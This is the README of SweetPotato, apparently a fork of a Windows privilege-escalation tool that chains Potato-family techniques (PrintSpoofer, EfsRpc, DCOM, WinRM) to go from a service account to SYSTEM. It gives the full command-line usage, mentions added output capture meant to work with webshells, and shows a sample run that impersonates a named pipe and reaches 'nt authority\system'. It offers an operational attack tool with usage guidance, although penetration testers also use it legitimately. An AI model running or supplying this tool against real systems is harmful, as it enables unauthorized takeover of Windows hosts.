# SweetPotato
### A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM

```
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default whoami)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help
```
+ NtApiDotNet embedded
+ execution output catching which will works better with webshell
+ Set default args to "whoami"

```
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
  Add NtApiDotNet embedded & execution output catching by Brian.W AKA BigCHAN

[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\az-yw-041/pipe/34dc3e02-4b7d-4b0b-a075-f87714a3798a
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c whoami 
execution output:
nt authority\system
```